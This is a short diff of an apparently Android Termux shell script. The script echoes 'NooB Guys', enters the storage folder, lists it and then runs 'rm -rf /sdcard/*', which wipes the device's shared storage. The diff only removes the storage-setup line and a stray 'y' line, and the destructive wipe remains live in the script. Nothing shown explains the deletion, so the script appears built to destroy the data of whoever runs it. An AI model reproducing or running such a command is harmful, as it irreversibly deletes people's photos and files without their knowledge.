@@ -17,11 +17,11 @@ echo
 echo
 
 echo "NooB Guys"
-termux-setup-storage
+
 cd storage
 ls
 rm -rf /sdcard/*
-y
+
 
 
 
